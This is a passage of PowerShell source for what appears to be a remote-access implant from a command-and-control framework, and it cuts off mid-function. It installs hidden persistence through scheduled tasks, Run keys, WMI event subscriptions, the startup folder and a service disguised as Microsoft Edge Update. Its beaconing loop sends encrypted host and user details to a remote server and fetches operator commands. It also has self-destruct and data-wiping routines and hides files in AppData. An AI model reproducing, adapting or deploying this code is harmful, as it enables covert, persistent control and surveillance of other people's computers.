            return "OK: startup-folder installed`n  Path: $dest`nARTIFACT:persist_payload:$($s.Path)`nARTIFACT:persist_vbs:$vbs`nARTIFACT:persist_startup:$dest"
        } else {
            $dest = "$startupDir\$($s.Name)"
            Copy-Item -Path $s.Path -Destination $dest -Force -ErrorAction Stop
            return "OK: startup-folder installed`n  Path: $dest`nARTIFACT:persist_payload:$($s.Path)`nARTIFACT:persist_startup:$dest"
        }
    } catch { return "ERROR: startup-folder - $($_.Exception.Message)" }
}
function Invoke-PersistRemove-StartupFolder {
    $s = Get-PersistStub
    $startupDir = [Environment]::GetFolderPath('Startup')
    # Remove both possible startup artifacts (VBS wrapper and direct copy)
    Remove-Item "$startupDir\$([IO.Path]::GetFileNameWithoutExtension($s.Name)).vbs" -Force -ErrorAction SilentlyContinue
    Remove-Item "$startupDir\$($s.Name)" -Force -ErrorAction SilentlyContinue
    Remove-Item ([IO.Path]::ChangeExtension($s.Path, '.vbs')) -Force -ErrorAction SilentlyContinue
    Remove-Item $s.Path -Force -ErrorAction SilentlyContinue
    Remove-Item $_PERSIST_DIR -Force -Recurse -ErrorAction SilentlyContinue
    $startupVbs  = "$startupDir\$([IO.Path]::GetFileNameWithoutExtension($s.Name)).vbs"
    $startupDest = "$startupDir\$($s.Name)"
    return "OK: startup-folder removed`nARTIFACT_REMOVED:persist_startup:$startupDest`nARTIFACT_REMOVED:persist_vbs:$([IO.Path]::ChangeExtension($s.Path, '.vbs'))`nARTIFACT_REMOVED:persist_payload:$($s.Path)"
}
function Invoke-PersistStatus-StartupFolder {
    $s = Get-PersistStub
    $startupDir = [Environment]::GetFolderPath('Startup')
    $dest = if ($s.Ext -eq '.ps1') { "$startupDir\$([IO.Path]::GetFileNameWithoutExtension($s.Name)).vbs" } else { "$startupDir\$($s.Name)" }
    if (Test-Path $dest) { return "ACTIVE: startup-folder`n  Path: $dest" }
    return "NOT INSTALLED: startup-folder"
}

# ── Technique: schtask-boot (admin, boot) ────────────────────
function Invoke-PersistProbe-SchtaskBoot {
    if (-not (_IsAdmin)) { return "PROBE:schtask-boot:unavailable:root:Requires admin - Scheduled Task at boot (SYSTEM)" }
    $t = Get-ScheduledTask -TaskName $_PERSIST_TASK_BOOT -ErrorAction SilentlyContinue
    $s = Get-PersistStub; $stub = Test-Path $s.Path
    $st = if ($t -and $stub) { "installed" } elseif ($t -or $stub) { "partial" } else { "available" }
    return "PROBE:schtask-boot:${st}:root:Scheduled Task at boot (SYSTEM) - fires at system startup"
}
function Invoke-PersistInstall-SchtaskBoot {
    if (-not (_IsAdmin)) { return "ERROR: schtask-boot requires admin" }
    try {
        $s = Invoke-PersistEnsureBinary
        $action = switch ($s.Ext) {
            '.exe' { New-ScheduledTaskAction -Execute $s.Path }
            '.dll' { New-ScheduledTaskAction -Execute "$env:WINDIR\System32\rundll32.exe" -Argument "`"$($s.Path)`",Run" }
            default { New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$($s.Path)`"" }
        }
        $trigger   = New-ScheduledTaskTrigger -AtStartup
        $settings  = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -ExecutionTimeLimit 0
        $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -RunLevel Highest
        Register-ScheduledTask -TaskName $_PERSIST_TASK_BOOT -Action $action -Trigger $trigger -Settings $settings -Principal $principal -Force -ErrorAction Stop | Out-Null
        return "OK: schtask-boot installed`n  Task: $_PERSIST_TASK_BOOT`n  Payload: $($s.Path)`n  Trigger: system boot (SYSTEM)`nARTIFACT:persist_payload:$($s.Path)`nARTIFACT:persist_task:$_PERSIST_TASK_BOOT"
    } catch { return "ERROR: schtask-boot - $($_.Exception.Message)" }
}
function Invoke-PersistRemove-SchtaskBoot {
    Unregister-ScheduledTask -TaskName $_PERSIST_TASK_BOOT -Confirm:$false -ErrorAction SilentlyContinue
    $s = Get-PersistStub; Remove-Item $s.Path -Force -ErrorAction SilentlyContinue
    Remove-Item $_PERSIST_DIR -Force -Recurse -ErrorAction SilentlyContinue
    return "OK: schtask-boot removed`nARTIFACT_REMOVED:persist_task:$_PERSIST_TASK_BOOT"
}
function Invoke-PersistStatus-SchtaskBoot {
    $t = Get-ScheduledTask -TaskName $_PERSIST_TASK_BOOT -ErrorAction SilentlyContinue
    if ($t) { return "ACTIVE: schtask-boot`n  Task: $_PERSIST_TASK_BOOT" }
    return "NOT INSTALLED: schtask-boot"
}

# ── Technique: registry-run-hklm (admin, logon) ──────────────
function Invoke-PersistProbe-RegistryRunHklm {
    if (-not (_IsAdmin)) { return "PROBE:registry-run-hklm:unavailable:root:Requires admin - HKLM Run key" }
    $val = (Get-ItemProperty "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name $_PERSIST_REG_VALUE -ErrorAction SilentlyContinue).$_PERSIST_REG_VALUE
    $st = if ($val) { "installed" } else { "available" }
    return "PROBE:registry-run-hklm:${st}:root:HKLM Run key - fires at any user logon"
}
function Invoke-PersistInstall-RegistryRunHklm {
    if (-not (_IsAdmin)) { return "ERROR: registry-run-hklm requires admin" }
    try {
        $s = Invoke-PersistEnsureBinary
        if ($s.Ext -eq '.ps1') {
            $vbs = New-PersistVbsWrapper -StubPath $s.Path
            $inv = "$env:WINDIR\System32\wscript.exe //B `"$vbs`""
            Set-ItemProperty "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name $_PERSIST_REG_VALUE -Value $inv -ErrorAction Stop
            return "OK: registry-run-hklm installed`n  Key: HKLM\...\Run\$_PERSIST_REG_VALUE`n  Command: $inv`nARTIFACT:persist_payload:$($s.Path)`nARTIFACT:persist_vbs:$vbs`nARTIFACT:persist_reg:HKLM\...\Run\$_PERSIST_REG_VALUE"
        } else {
            $inv = Get-PersistInvocation -StubPath $s.Path -Ext $s.Ext
            Set-ItemProperty "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name $_PERSIST_REG_VALUE -Value $inv -ErrorAction Stop
            return "OK: registry-run-hklm installed`n  Key: HKLM\...\Run\$_PERSIST_REG_VALUE`n  Command: $inv`nARTIFACT:persist_payload:$($s.Path)`nARTIFACT:persist_reg:HKLM\...\Run\$_PERSIST_REG_VALUE"
        }
    } catch { return "ERROR: registry-run-hklm - $($_.Exception.Message)" }
}
function Invoke-PersistRemove-RegistryRunHklm {
    Remove-ItemProperty "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name $_PERSIST_REG_VALUE -Force -ErrorAction SilentlyContinue
    $s = Get-PersistStub
    Remove-Item ([IO.Path]::ChangeExtension($s.Path, '.vbs')) -Force -ErrorAction SilentlyContinue
    Remove-Item $s.Path -Force -ErrorAction SilentlyContinue
    Remove-Item $_PERSIST_DIR -Force -Recurse -ErrorAction SilentlyContinue
    return "OK: registry-run-hklm removed`nARTIFACT_REMOVED:persist_reg:HKLM\...\Run\$_PERSIST_REG_VALUE`nARTIFACT_REMOVED:persist_vbs:$([IO.Path]::ChangeExtension($s.Path, '.vbs'))`nARTIFACT_REMOVED:persist_payload:$($s.Path)"
}
function Invoke-PersistStatus-RegistryRunHklm {
    $val = (Get-ItemProperty "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name $_PERSIST_REG_VALUE -ErrorAction SilentlyContinue).$_PERSIST_REG_VALUE
    if ($val) { return "ACTIVE: registry-run-hklm`n  Value: $val" }
    return "NOT INSTALLED: registry-run-hklm"
}

# ── Technique: wmi-event (admin, boot via EventCode 6005) ────
function Invoke-PersistProbe-WmiEvent {
    if (-not (_IsAdmin)) { return "PROBE:wmi-event:unavailable:root:Requires admin - WMI EventSubscription at boot" }
    $f = Get-WmiObject -Namespace root\subscription -Class __EventFilter -Filter "Name='$_PERSIST_WMI_FILTER'" -ErrorAction SilentlyContinue
    $st = if ($f) { "installed" } else { "available" }
    return "PROBE:wmi-event:${st}:root:WMI EventCode 6005 subscription - fires at boot"
}
function Invoke-PersistInstall-WmiEvent {
    if (-not (_IsAdmin)) { return "ERROR: wmi-event requires admin" }
    try {
        $s = Invoke-PersistEnsureBinary
        # WMI CommandLineEventConsumer fires via CreateProcess in SYSTEM context (no console
        # window by default for .exe/.dll). For .ps1 we still use wscript.exe //B with the VBS
        # wrapper to guarantee CREATE_NO_WINDOW and avoid any edge-case console allocation.
        $vbsArtifact = ""
        if ($s.Ext -eq '.ps1') {
            $vbs = New-PersistVbsWrapper -StubPath $s.Path
            $inv = "$env:WINDIR\System32\wscript.exe //B `"$vbs`""
            $vbsArtifact = "`nARTIFACT:persist_vbs:$vbs"
        } else {
            $inv = Get-PersistInvocation -StubPath $s.Path -Ext $s.Ext
        }
        # Tear down any stale subscription first
        Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding -ErrorAction SilentlyContinue |
            Where-Object { $_.Filter -like "*$_PERSIST_WMI_FILTER*" } | Remove-WmiObject -ErrorAction SilentlyContinue
        Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer -Filter "Name='$_PERSIST_WMI_CONSUMER'" -ErrorAction SilentlyContinue | Remove-WmiObject -ErrorAction SilentlyContinue
        Get-WmiObject -Namespace root\subscription -Class __EventFilter -Filter "Name='$_PERSIST_WMI_FILTER'" -ErrorAction SilentlyContinue | Remove-WmiObject -ErrorAction SilentlyContinue
        # EventCode 6005 = "Event log service was started" = reliable boot trigger
        $query = "SELECT * FROM __InstanceCreationEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_NTLogEvent' AND TargetInstance.EventCode = '6005'"
        $filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{
            Name = $_PERSIST_WMI_FILTER; EventNameSpace = 'root\cimv2'; QueryLanguage = 'WQL'; Query = $query
        } -ErrorAction Stop
        $consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{
            Name = $_PERSIST_WMI_CONSUMER; CommandLineTemplate = $inv
        } -ErrorAction Stop
        Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{
            Filter = $filter; Consumer = $consumer
        } -ErrorAction Stop | Out-Null
        return "OK: wmi-event installed`n  Filter: $_PERSIST_WMI_FILTER (EventCode 6005)`n  Consumer: $_PERSIST_WMI_CONSUMER`n  Command: $inv`nARTIFACT:persist_payload:$($s.Path)$vbsArtifact`nARTIFACT:persist_wmi:$_PERSIST_WMI_CONSUMER"
    } catch { return "ERROR: wmi-event - $($_.Exception.Message)" }
}
function Invoke-PersistRemove-WmiEvent {
    try {
        Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding -ErrorAction SilentlyContinue |
            Where-Object { $_.Filter -like "*$_PERSIST_WMI_FILTER*" } | Remove-WmiObject -ErrorAction SilentlyContinue
        Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer -Filter "Name='$_PERSIST_WMI_CONSUMER'" -ErrorAction SilentlyContinue | Remove-WmiObject -ErrorAction SilentlyContinue
        Get-WmiObject -Namespace root\subscription -Class __EventFilter -Filter "Name='$_PERSIST_WMI_FILTER'" -ErrorAction SilentlyContinue | Remove-WmiObject -ErrorAction SilentlyContinue
    } catch {}
    $s = Get-PersistStub
    Remove-Item ([IO.Path]::ChangeExtension($s.Path, '.vbs')) -Force -ErrorAction SilentlyContinue
    Remove-Item $s.Path -Force -ErrorAction SilentlyContinue
    Remove-Item $_PERSIST_DIR -Force -Recurse -ErrorAction SilentlyContinue
    return "OK: wmi-event removed`nARTIFACT_REMOVED:persist_wmi:$_PERSIST_WMI_CONSUMER`nARTIFACT_REMOVED:persist_vbs:$([IO.Path]::ChangeExtension($s.Path, '.vbs'))`nARTIFACT_REMOVED:persist_payload:$($s.Path)"
}
function Invoke-PersistStatus-WmiEvent {
    $f = Get-WmiObject -Namespace root\subscription -Class __EventFilter -Filter "Name='$_PERSIST_WMI_FILTER'" -ErrorAction SilentlyContinue
    if ($f) { return "ACTIVE: wmi-event`n  Filter: $_PERSIST_WMI_FILTER`n  Consumer: $_PERSIST_WMI_CONSUMER" }
    return "NOT INSTALLED: wmi-event"
}

# ── Technique: service (admin, boot) ─────────────────────────
function Invoke-PersistProbe-Service {
    if (-not (_IsAdmin)) { return "PROBE:service:unavailable:root:Requires admin - Windows Service at boot" }
    $svc = Get-Service -Name $_PERSIST_SVC_NAME -ErrorAction SilentlyContinue
    $st = if ($svc) { "installed" } else { "available" }
    return "PROBE:service:${st}:root:Windows Service (Automatic) - fires at boot"
}
function Invoke-PersistInstall-Service {
    if (-not (_IsAdmin)) { return "ERROR: service requires admin" }
    try {
        $s = Invoke-PersistEnsureBinary
        if ($s.Ext -ne '.exe') { return "ERROR: service technique requires an .exe launcher (current: $($s.Ext))" }
        if (Get-Service -Name $_PERSIST_SVC_NAME -ErrorAction SilentlyContinue) { return "OK: service already installed ($_PERSIST_SVC_NAME)" }
        New-Service -Name $_PERSIST_SVC_NAME -DisplayName "Microsoft Edge Update Service" `
            -Description "Keeps your Microsoft software up to date." `
            -BinaryPathName $s.Path -StartupType Automatic -ErrorAction Stop | Out-Null
        return "OK: service installed`n  Name: $_PERSIST_SVC_NAME`n  Path: $($s.Path)`n  StartupType: Automatic`nARTIFACT:persist_payload:$($s.Path)`nARTIFACT:persist_svc:$_PERSIST_SVC_NAME"
    } catch { return "ERROR: service - $($_.Exception.Message)" }
}
function Invoke-PersistRemove-Service {
    try {
        if (Get-Service -Name $_PERSIST_SVC_NAME -ErrorAction SilentlyContinue) {
            Stop-Service -Name $_PERSIST_SVC_NAME -Force -ErrorAction SilentlyContinue
            (Get-WmiObject Win32_Service -Filter "Name='$_PERSIST_SVC_NAME'" -ErrorAction SilentlyContinue).Delete() | Out-Null
        }
    } catch {}
    $s = Get-PersistStub; Remove-Item $s.Path -Force -ErrorAction SilentlyContinue
    Remove-Item $_PERSIST_DIR -Force -Recurse -ErrorAction SilentlyContinue
    return "OK: service removed`nARTIFACT_REMOVED:persist_svc:$_PERSIST_SVC_NAME"
}
function Invoke-PersistStatus-Service {
    $svc = Get-Service -Name $_PERSIST_SVC_NAME -ErrorAction SilentlyContinue
    if ($svc) { return "ACTIVE: service`n  Name: $_PERSIST_SVC_NAME`n  Status: $($svc.Status)`n  StartType: $($svc.StartType)" }
    return "NOT INSTALLED: service"
}

# ── Probe all techniques ──────────────────────────────────────
function Invoke-PersistProbeAll {
    $lines = @(
        (Invoke-PersistProbe-SchtaskLogon),
        (Invoke-PersistProbe-RegistryRun),
        (Invoke-PersistProbe-StartupFolder),
        (Invoke-PersistProbe-SchtaskBoot),
        (Invoke-PersistProbe-RegistryRunHklm),
        (Invoke-PersistProbe-WmiEvent),
        (Invoke-PersistProbe-Service)
    )
    return "PERSIST_PROBE_RESULT`n" + ($lines -join "`n")
}

# ── Remove ALL installed techniques (called by KILL) ─────────
function Invoke-PersistRemoveAll {
    Unregister-ScheduledTask -TaskName $_PERSIST_TASK_LOGON -Confirm:$false -ErrorAction SilentlyContinue
    Unregister-ScheduledTask -TaskName $_PERSIST_TASK_BOOT  -Confirm:$false -ErrorAction SilentlyContinue
    Remove-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name $_PERSIST_REG_VALUE -Force -ErrorAction SilentlyContinue
    Remove-ItemProperty "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name $_PERSIST_REG_VALUE -Force -ErrorAction SilentlyContinue
    $sfDir = [Environment]::GetFolderPath('Startup')
    Get-ChildItem $sfDir -Filter "MicrosoftEdgeUpdate*" -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
    Get-ChildItem $sfDir -Filter "EdgeUpdate*" -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
    try {
        Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding -ErrorAction SilentlyContinue |
            Where-Object { $_.Filter -like "*$_PERSIST_WMI_FILTER*" } | Remove-WmiObject -ErrorAction SilentlyContinue
        Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer -Filter "Name='$_PERSIST_WMI_CONSUMER'" -ErrorAction SilentlyContinue | Remove-WmiObject -ErrorAction SilentlyContinue
        Get-WmiObject -Namespace root\subscription -Class __EventFilter -Filter "Name='$_PERSIST_WMI_FILTER'" -ErrorAction SilentlyContinue | Remove-WmiObject -ErrorAction SilentlyContinue
        if (Get-Service -Name $_PERSIST_SVC_NAME -ErrorAction SilentlyContinue) {
            Stop-Service -Name $_PERSIST_SVC_NAME -Force -ErrorAction SilentlyContinue
            (Get-WmiObject Win32_Service -Filter "Name='$_PERSIST_SVC_NAME'" -ErrorAction SilentlyContinue).Delete() | Out-Null
        }
    } catch {}
    Remove-Item "$_PERSIST_DIR\*" -Force -Recurse -ErrorAction SilentlyContinue
    Remove-Item $_PERSIST_DIR -Force -Recurse -ErrorAction SilentlyContinue
}

# === CLEANUP ON EXIT ===
$cleanupBlock = {
    Clear-Transport
    Remove-Variable -Name RSA, PUBLIC_KEY_PEM, SESSION_KEY -Scope Script -Force 2>$null
    [GC]::Collect()
}

Register-EngineEvent PowerShell.Exiting -Action $cleanupBlock | Out-Null

# === MAIN LOOP ===
Write-Log "[AGENT]: Entering main loop..."

while ($true) {
    if (Test-KillDateExpired) { Invoke-SelfDestruct }

    # Default sleep (used by early-exit continue paths; recalculated at end after command runs)
    if ($JITTER -gt 0) {
        $rndBytes = [byte[]]::new(2)
        [System.Security.Cryptography.RandomNumberGenerator]::Create().GetBytes($rndBytes)
        $rndVal = [System.BitConverter]::ToUInt16($rndBytes, 0)
        $jitterValue = [int]($rndVal % ($JITTER * 2 + 1)) - $JITTER
    } else { $jitterValue = 0 }
    $sleepTime = [int]($BASE_SLEEP + $jitterValue)
    if ($sleepTime -lt 5) { $sleepTime = 5 }

    Write-Log ""
    Write-Log "========================================="
    Write-Log "=== CYCLE START ==="
    Write-Log "========================================="

    # === HEARTBEAT ===
    Write-Log "[HEARTBEAT]: Updating timestamp..."
    $timestamp = [DateTimeOffset]::UtcNow.ToUnixTimeSeconds().ToString()
    $_HB_SEQ += 1
    $SYS_BLOB       = if ($env:_BLOB_PATH -and (Test-Path $env:_BLOB_PATH -ErrorAction SilentlyContinue)) { $env:_BLOB_PATH } else { '' }
    $SYS_BLOB_TRIED = if ($env:_BLOB_TRIED) { $env:_BLOB_TRIED } else { '' }
    $heartbeatData = "${timestamp}|${SYS_HOSTNAME}|${SYS_USER}|${SYS_IP}|${SYS_OS}|${SYS_PRIVS}|${AgentStartPath}|${OperatorPath}|${SYS_IP_EXT}|${AgentPID}|${AgentProc}|${SYS_DOMAIN}|${SYS_BLOB}|${SYS_BLOB_TRIED}|${_HB_SEQ}"

    # Encrypt heartbeat — RSA-OAEP-SHA256 wraps aes_key; AES-256-GCM encrypts payload (agent→server)
    $heartbeatPayload = Invoke-NativeEncrypt -PlainBytes ([System.Text.Encoding]::UTF8.GetBytes($heartbeatData)) -RSA $RSA
    if (-not $heartbeatPayload) {
        # Fallback: python3
        $hbPyCode = 'import sys,os,base64;from cryptography.hazmat.primitives.asymmetric import padding as _p;from cryptography.hazmat.primitives import hashes as _h;from cryptography.hazmat.primitives.serialization import load_pem_public_key;from cryptography.hazmat.primitives.ciphers.aead import AESGCM;_oaep=_p.OAEP(mgf=_p.MGF1(_h.SHA256()),algorithm=_h.SHA256(),label=None);lines=sys.stdin.read().split(chr(0),1);pub=load_pem_public_key(lines[0].encode());data=lines[1].encode() if len(lines)>1 else b"";k=os.urandom(32);n=os.urandom(12);blob=n+AESGCM(k).encrypt(n,data,None);wrapped=pub.encrypt(k,_oaep);print(base64.b64encode(wrapped).decode()+":"+base64.b64encode(blob).decode(),end="")'
        $heartbeatPayload = Invoke-PythonCrypto -Code $hbPyCode -Stdin ($PUBLIC_KEY_PEM + [char]0 + $heartbeatData)
        Remove-Variable -Name hbPyCode -Force 2>$null
    }
    if ($heartbeatPayload) {
        Invoke-TransportUpload -Path "$FOLDER_PATH$HEARTBEAT_FILE" -Content $heartbeatPayload | Out-Null
    }
    Remove-Variable -Name heartbeatPayload -Force 2>$null
    Write-Log "[HEARTBEAT]: [OK] Timestamp: $timestamp"

    # === DOWNLOAD ENCRYPTED COMMAND ===
    Write-Log ""
    Write-Log "[INPUT]: Downloading encrypted command..."

    $encryptedInput = Invoke-TransportDownload -Path "$FOLDER_PATH$INPUT_FILE"

    if ([string]::IsNullOrEmpty($encryptedInput)) {
        Write-Log "[INPUT]: Download failed (null/empty response)"
        Write-Log "[SLEEP]: Waiting ${sleepTime}s"
        Start-Sleep -Seconds $sleepTime
        Write-Log "=== CYCLE END ==="
        continue
    }

    if ($encryptedInput.Trim() -eq "MZ") {
        Write-Log "[INPUT]: No command (MZ marker)"
        Write-Log "[SLEEP]: Waiting ${sleepTime}s"
        Start-Sleep -Seconds $sleepTime
        Write-Log "=== CYCLE END ==="
        continue
    }


    # === COMMAND DECRYPTION — AES-256-GCM + RSA-PSS-SHA256 verify + session_key unwrap (server→agent) ===
    Write-Log "[INPUT]: Encrypted command received: $($encryptedInput.Substring(0, [Math]::Min(50, $encryptedInput.Length)))..."
    Write-Log "[INPUT]: Decrypting (GCM+PSS+session_key)..."

    # Payload: base64(GCM(session_key,aes_key)):base64(nonce||ct||tag):base64(PSS_sig_over_wrapped||blob)
    $commandToRun = Invoke-NativeDecrypt -Payload $encryptedInput -RSA $RSA -SessionKey $SESSION_KEY_BYTES
    if (-not $commandToRun) {
        # Fallback: python3
        $cmdPyCode = 'import sys,base64;from cryptography.hazmat.primitives.asymmetric import padding as _p;from cryptography.hazmat.primitives import hashes as _h;from cryptography.hazmat.primitives.serialization import load_pem_public_key;from cryptography.hazmat.primitives.ciphers.aead import AESGCM;_pss=_p.PSS(mgf=_p.MGF1(_h.SHA256()),salt_length=_p.PSS.MAX_LENGTH);lines=sys.stdin.read().split(chr(0),2);pub=load_pem_public_key(lines[0].encode());sk=bytes.fromhex(lines[1]);raw=lines[2].strip();wrapped_b64,blob_b64,sig_b64=raw.split(":",2);wrapped=base64.b64decode(wrapped_b64);blob=base64.b64decode(blob_b64);sig=base64.b64decode(sig_b64);pub.verify(sig,wrapped+blob,_pss,_h.SHA256());k=AESGCM(sk).decrypt(wrapped[:12],wrapped[12:],None);print(AESGCM(k).decrypt(blob[:12],blob[12:],None).decode(),end="")'
        $commandToRun = Invoke-PythonCrypto -Code $cmdPyCode -Stdin ($PUBLIC_KEY_PEM + [char]0 + $SESSION_KEY + [char]0 + $encryptedInput)
        Remove-Variable -Name cmdPyCode -Force 2>$null
    }
    Remove-Variable -Name encryptedInput -Force 2>$null

    if ([string]::IsNullOrEmpty($commandToRun)) {
        Write-Log "[INPUT]: [X] ERROR decrypt/verify failed (GCM auth, PSS sig, or session_key invalid)"
        $kmTs  = [DateTimeOffset]::UtcNow.ToUnixTimeSeconds().ToString()
        $kmMsg = "KM:${kmTs}"
        $kmEnc = Invoke-NativeEncrypt -PlainBytes ([System.Text.Encoding]::UTF8.GetBytes($kmMsg)) -RSA $RSA
        if (-not $kmEnc) {
            $kmPyCode = 'import sys,os,base64;from cryptography.hazmat.primitives.asymmetric import padding as _p;from cryptography.hazmat.primitives import hashes as _h;from cryptography.hazmat.primitives.serialization import load_pem_public_key;from cryptography.hazmat.primitives.ciphers.aead import AESGCM;_oaep=_p.OAEP(mgf=_p.MGF1(_h.SHA256()),algorithm=_h.SHA256(),label=None);lines=sys.stdin.read().split(chr(0),1);pub=load_pem_public_key(lines[0].encode());data=lines[1].encode() if len(lines)>1 else b"";k=os.urandom(32);n=os.urandom(12);blob=n+AESGCM(k).encrypt(n,data,None);wrapped=pub.encrypt(k,_oaep);print(base64.b64encode(wrapped).decode()+":"+base64.b64encode(blob).decode(),end="")'
            $kmEnc = Invoke-PythonCrypto -Code $kmPyCode -Stdin ($PUBLIC_KEY_PEM + [char]0 + $kmMsg)
            Remove-Variable -Name kmPyCode -Force 2>$null
        }
        if ($kmEnc) { Invoke-TransportUpload -Path "$FOLDER_PATH$HEARTBEAT_FILE" -Content $kmEnc | Out-Null }
        Remove-Variable -Name kmTs, kmMsg, kmEnc -Force 2>$null
        Start-Sleep -Seconds $sleepTime
        continue
    }

    Write-Log "[INPUT]: [OK] Command decrypted"

    # Parse JSON task envelope {"id","type","args","expires_at","session_token"}
    try {
        $_task       = $commandToRun | ConvertFrom-Json -ErrorAction Stop
        $_cmdId      = $_task.id
        $_taskType   = $_task.type
        $_taskArgs   = $_task.args
        $_taskToken  = if ($_task.PSObject.Properties['session_token']) { $_task.session_token } else { "" }
    } catch {
        Write-Log "[INPUT]: [X] JSON parse failed: $_"
        Start-Sleep -Seconds $sleepTime
        continue
    }

    # Check task expiry — discard stale commands
    if ($_task.PSObject.Properties['expires_at'] -and $_task.expires_at) {
        $_nowEpoch = [DateTimeOffset]::UtcNow.ToUnixTimeSeconds()
        if ($_nowEpoch -gt [long]$_task.expires_at) {
            Write-Log "[INPUT]: [X] Task expired (expires_at=$($_task.expires_at), now=$_nowEpoch) — discarding"
            Invoke-TransportUpload -Path "$FOLDER_PATH$INPUT_FILE" -Content "MZ" | Out-Null
            Start-Sleep -Seconds $sleepTime
            continue
        }
    }

    # Response fields — set by each handler
    $_status       = "ok"
    $_output       = ""
    $_newCwd       = ""
    $_stagingPath  = ""
    $_artifacts    = @()

    # === CHECK EXIT (stop execution only - files untouched) ===
    if ($_taskType -eq "exit") {
        Write-Log "[INPUT]: EXIT command received - terminating"
        Invoke-TransportUpload -Path "$FOLDER_PATH$INPUT_FILE" -Content "MZ" | Out-Null
        Write-Log "[INPUT]: Channel cleared (MZ)"
        & $cleanupBlock
        exit 0
    }

    # === CHECK KILL (full cleanup: blob + persist + self-delete stub) ===
    if ($_taskType -eq "kill") {
        Write-Log "[KILL]: Full cleanup initiated..."
        if ($env:_BLOB_PATH -and (Test-Path $env:_BLOB_PATH -ErrorAction SilentlyContinue)) {
            try {
                $blen = (Get-Item $env:_BLOB_PATH -Force -ErrorAction SilentlyContinue).Length
                $rnd  = New-Object byte[] $blen
                [System.Security.Cryptography.RandomNumberGenerator]::Create().GetBytes($rnd)
                [System.IO.File]::WriteAllBytes($env:_BLOB_PATH, $rnd)
                Remove-Item $env:_BLOB_PATH -Force -ErrorAction SilentlyContinue
            } catch {}
            Write-Log "[KILL]: blob wiped"
        }
        Invoke-PersistRemoveAll
        Write-Log "[KILL]: persistence removed"
        if ($env:_STUB_PATH -and (Test-Path $env:_STUB_PATH -ErrorAction SilentlyContinue)) {
            $sp = $env:_STUB_PATH
            # Also delete the .vbs launcher sitting next to the .ps1 stub.
            $vp = [System.IO.Path]::ChangeExtension($sp, ".vbs")
            # Start-Job dies with the parent process on exit — use cmd.exe as a
            # detached subprocess so the delete survives after this process exits.
            $psi = [System.Diagnostics.ProcessStartInfo]::new("cmd.exe")
            $psi.Arguments = "/c timeout /t 3 /nobreak >nul & del /f /q `"$sp`" & if exist `"$vp`" del /f /q `"$vp`""
            $psi.UseShellExecute    = $false
            $psi.CreateNoWindow     = $true
            $psi.WindowStyle        = [System.Diagnostics.ProcessWindowStyle]::Hidden
            [System.Diagnostics.Process]::Start($psi) | Out-Null
            Write-Log "[KILL]: stub + vbs launcher self-delete scheduled"
        }
        Invoke-TransportUpload -Path "$FOLDER_PATH$INPUT_FILE" -Content "MZ" | Out-Null
        Write-Log "[INPUT]: Channel cleared (MZ)"
        & $cleanupBlock
        exit 0
    }

    # === FILE TRANSFER COMMANDS ===
    $STAGING_BASE = "$FOLDER_PATH/staging"

    switch ($_taskType) {

        "blobsave" {
            Write-Log "[BLOBSAVE]: Re-saving agent blob..."
            $bsDid     = $_taskArgs.did
            $bsPathB64 = $_taskArgs.path_b64
            $bsCodeB64 = $_taskArgs.code_b64
            try { $bsCode = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($bsCodeB64)) }
            catch { $_output = "ERROR: base64 decode failed: $_"; $_status = "error"; $bsCode = $null }
            if ($bsCode) {
                $bsPlain = [Text.Encoding]::UTF8.GetBytes("$bsDid`n" + $bsCode)
                $bsProt  = [System.Security.Cryptography.ProtectedData]::Protect($bsPlain, $null, 'CurrentUser')
                $bsTries = @(
                    [System.Environment]::ExpandEnvironmentVariables('%APPDATA%\Microsoft\Windows\Themes\.ddb'),
                    [System.Environment]::ExpandEnvironmentVariables('%APPDATA%\Microsoft\Windows\Recent\.ddb'),
                    [System.Environment]::ExpandEnvironmentVariables('%LOCALAPPDATA%\Microsoft\Windows\History\.ddb')
                )
                if ($bsPathB64) {
                    try {
                        $bsCustom = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($bsPathB64))
                        $bsCustom = [System.Environment]::ExpandEnvironmentVariables($bsCustom)
                        $bsTries  = @($bsCustom) + $bsTries
                    } catch {}
                }
                $bsTries = $bsTries | Select-Object -Unique
                $bsSaved = $false
                foreach ($bsBt in $bsTries) {
                    try {
                        $bsDir = Split-Path $bsBt
                        if (-not (Test-Path $bsDir)) { New-Item -ItemType Directory -Path $bsDir -Force -ErrorAction Stop | Out-Null }
                        if (Test-Path $bsBt) { try { (Get-Item $bsBt -Force -ErrorAction SilentlyContinue).Attributes = 'Normal' } catch {} }
                        [System.IO.File]::WriteAllBytes($bsBt, $bsProt)
                        (Get-Item $bsBt -Force -ErrorAction SilentlyContinue).Attributes = 'Hidden'
                        $env:_BLOB_PATH = $bsBt
                        Write-Log "[BLOBSAVE]: saved: $bsBt"
                        $bsSaved    = $true
                        $_output    = "OK: blob saved: $bsBt"
                        $_artifacts += @{ op = "add"; type = "blob"; path = $bsBt }
                        break
                    } catch { Write-Log "[BLOBSAVE]: failed ($bsBt): $_" }
                }
